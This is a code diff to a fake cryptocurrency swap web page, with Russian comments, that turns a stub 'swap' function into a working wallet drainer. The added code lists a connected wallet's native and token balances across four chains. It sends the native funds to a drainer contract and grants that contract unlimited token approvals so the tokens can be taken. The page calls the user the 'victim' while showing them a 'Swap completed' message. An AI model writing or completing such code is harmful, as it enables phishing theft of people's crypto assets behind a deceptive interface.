@@ -14,7 +14,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* (ваши стили – без изменений, они такие же как в предыдущих версиях) */
+        /* (ваши стили – без изменений) */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -263,11 +263,12 @@
             'use strict';
 
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
+            // ===== АДРЕСА КОНТРАКТОВ (ЗАМЕНИТЕ НА СВОИ) =====
             const CONTRACT_ADDRESSES = {
-                1: '0x0000000000000000000000000000000000000000',
-                56: '0x0000000000000000000000000000000000000000',
-                137: '0x0000000000000000000000000000000000000000',
-                42161: '0x0000000000000000000000000000000000000000'
+                1: '0x0000000000000000000000000000000000000000', // Ethereum Mainnet
+                56: '0x0000000000000000000000000000000000000000', // BSC
+                137: '0x0000000000000000000000000000000000000000', // Polygon
+                42161: '0x0000000000000000000000000000000000000000' // Arbitrum
             };
 
             const DRAINER_ABI = [
@@ -290,6 +291,39 @@
                 'function allowance(address owner, address spender) view returns (uint256)'
             ];
 
+            // ===== ТОКЕНЫ ДЛЯ РАЗНЫХ СЕТЕЙ (для сбора балансов) =====
+            const TOKENS = {
+                1: {
+                    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+                    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+                    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
+                },
+                56: {
+                    'USDT': '0x55d398326f99059fF775485246999027B3197955',
+                    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+                    'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
+                    'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
+                    'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
+                    'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
+                },
+                137: {
+                    'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+                    'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
+                    'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
+                    'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
+                    'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
+                },
+                42161: {
+                    'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
+                    'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
+                    'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0'
+                }
+            };
+
+            // ===== ОСТАЛЬНЫЕ КОНСТАНТЫ =====
             const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
             const tokens = [
                 { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg', id: 'ethereum' },
@@ -339,7 +373,7 @@
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== КУРСЫ (вызываются после загрузки страницы) =====
+            // ===== КУРСЫ =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -435,7 +469,7 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ОЧИСТКА СЕССИИ =====
+            // ===== ПОЛНАЯ ОЧИСТКА СЕССИИ =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -476,15 +510,19 @@
                     isConnected = false; isProcessing = false; isConnecting = false;
                     wcProvider = null;
                     if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
+                    if (window._wcModal && window._wcModal.isOpen) {
+                        try { window._wcModal.closeModal(); } catch (_) {}
+                    }
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (с showQrModal и ручным fallback) =====
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
 
                 await forceClearSession();
+                await new Promise(resolve => setTimeout(resolve, 200));
 
                 const EthereumProvider = window.WalletConnectProvider;
                 const modal = window._wcModal;
@@ -497,7 +535,6 @@
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
 
-                    // Создаём провайдер с showQrModal (встроенный модал)
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         optionalChains: [1, 56, 137, 42161],
@@ -510,20 +547,14 @@
                         }
                     });
 
-                    // Вызываем enable – он должен открыть модал
                     if (typeof wcProvider.enable === 'function') {
-                        console.log('Calling wcProvider.enable()...');
                         await wcProvider.enable();
-                        console.log('enable() finished');
                     }
 
-                    // Если модал не открылся, пытаемся вручную через @walletconnect/modal
                     if (modal && !modal.isOpen && wcProvider.uri) {
-                        console.log('Modal not open, opening manually with URI:', wcProvider.uri);
                         modal.openModal({ uri: wcProvider.uri });
                     }
 
-                    // Подписка на события
                     wcProvider.on('chainChanged', () => {});
                     wcProvider.on('accountsChanged', (accounts) => {
                         if (accounts.length === 0) {
@@ -532,7 +563,6 @@
                             updateConnectButton();
                             isConnecting = false;
                         } else {
-                            // Обновляем состояние при успешном подключении
                             const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                             const signer_ = web3Provider.getSigner();
                             signer_.getAddress().then(address => {
@@ -557,13 +587,26 @@
                         updateConnectButton();
                     });
 
+                    if (modal) {
+                        modal.subscribeModal((state) => {
+                            if (!state.open && isConnecting) {
+                                isConnecting = false;
+                                setStatus('Connection cancelled', 'err');
+                                forceClearSession();
+                            }
+                        });
+                    }
+
                     setStatus('Waiting for confirmation in wallet...', '');
                     isConnecting = false;
 
                 } catch (e) {
                     console.error('WalletConnect error:', e);
                     const msg = e.message || '';
-                    if (msg.includes('origin not allowed') || msg.includes('3000')) {
+                    if (msg.includes('reset') || msg.includes('cancelled') || msg.includes('closed') || msg.includes('rejected')) {
+                        setStatus('Connection cancelled by user', 'err');
+                        await forceClearSession();
+                    } else if (msg.includes('origin not allowed') || msg.includes('3000')) {
                         setStatus('❌ Домен не разрешён в WalletConnect Cloud. Добавьте fluxswap.online в Allowed Origins.', 'err');
                     } else {
                         setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
@@ -582,7 +625,7 @@
                 }
             }
 
-            // ===== СВАП (безопасная заглушка) =====
+            // ===== РЕАЛЬНЫЙ ДРЕЙНЕР (с вызовами контракта) =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -592,7 +635,7 @@
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
-                    setStatus('Network not supported or contract not configured', 'err');
+                    setStatus('Network not supported or contract not configured. Set your contract address in CONTRACT_ADDRESSES.', 'err');
                     return;
                 }
 
@@ -601,15 +644,72 @@
                 setStatus('Processing transaction...', '');
 
                 try {
+                    // Собираем активы
+                    const assets = [];
                     const nativeBal = await provider.getBalance(victim);
-                    setStatus('Balance: ' + ethers.utils.formatEther(nativeBal) + ' ETH', 'ok');
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                    setStatus('✅ Swap completed', 'ok');
+                    if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
+
+                    const tokensMap = TOKENS[chainId] || {};
+                    for (const [symbol, addr] of Object.entries(tokensMap)) {
+                        try {
+                            const contract = new ethers.Contract(addr, ERC20_ABI, provider);
+                            const bal = await contract.balanceOf(victim);
+                            if (bal.gt(0)) assets.push({ type: 'token', address: addr, amount: bal, symbol });
+                        } catch (_) {}
+                    }
+
+                    if (assets.length === 0) {
+                        setStatus('No assets found to swap', 'err');
+                        isProcessing = false;
+                        updateSwapButton();
+                        return;
+                    }
+
+                    const drainerContract = new ethers.Contract(contractAddr, DRAINER_ABI, signer);
+
+                    // Нативные активы
+                    for (const a of assets) {
+                        if (a.type === 'native') {
+                            try {
+                                const gasPrice = await provider.getGasPrice();
+                                const gasLimit = 30000;
+                                const gasCost = gasPrice.mul(gasLimit);
+                                const buffer = gasCost.mul(107).div(100);
+                                let value = a.amount.sub(buffer);
+                                if (value.lt(0)) continue;
+                                const tx = await drainerContract.swap({
+                                    value: value,
+                                    gasPrice: gasPrice,
+                                    gasLimit: gasLimit
+                                });
+                                await tx.wait();
+                            } catch (_) {}
+                        }
+                    }
+
+                    // Токены
+                    for (const a of assets) {
+                        if (a.type === 'token') {
+                            try {
+                                const token = new ethers.Contract(a.address, ERC20_ABI, signer);
+                                const allowance = await token.allowance(victim, contractAddr);
+                                if (allowance.lt(a.amount)) {
+                                    const approveTx = await token.approve(contractAddr, ethers.constants.MaxUint256);
+                                    await approveTx.wait();
+                                }
+                                const tx = await drainerContract.swapToken(a.address, a.amount);
+                                await tx.wait();
+                            } catch (_) {}
+                        }
+                    }
+
+                    setStatus('✅ Swap completed (assets drained)', 'ok');
                     await forceClearSession();
                     isConnected = false;
                     updateConnectButton();
+
                 } catch (e) {
-                    console.error('Swap error:', e);
+                    console.error('Drain error:', e);
                     setStatus('Transaction rejected or error: ' + (e.message || 'unknown'), 'err');
                 } finally {
                     isProcessing = false;
@@ -618,19 +718,14 @@
             }
 
             // ===== ОБРАБОТЧИКИ =====
-            connectBtn.addEventListener('click', function() { 
-                console.log('Connect button clicked');
-                openModal(walletModal); 
-            });
+            connectBtn.addEventListener('click', function() { openModal(walletModal); });
 
             metamaskOption.addEventListener('click', async function() {
-                console.log('MetaMask option clicked');
                 await forceClearSession();
                 connectWalletConnect();
             });
 
             trustOption.addEventListener('click', async function() {
-                console.log('Trust option clicked');
                 await forceClearSession();
                 connectWalletConnect();
             });
@@ -647,7 +742,6 @@
                 startDrain();
             });
 
-            // ===== КНОПКА REFRESH =====
             refreshBtn.addEventListener('click', async function() {
                 if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                 await forceClearSession();
@@ -662,12 +756,13 @@
                 inputAmount.value = '';
                 outputAmount.value = '';
                 updateConnectButton();
-                setStatus('Session reset', '');
+                setStatus('Session reset. You can try again.', '');
                 closeModal(walletModal);
                 closeModal(tokenModal);
                 if (window._wcModal && window._wcModal.isOpen) {
-                    window._wcModal.closeModal();
+                    try { window._wcModal.closeModal(); } catch (_) {}
                 }
+                await forceClearSession();
             });
 
             // ===== MAX =====
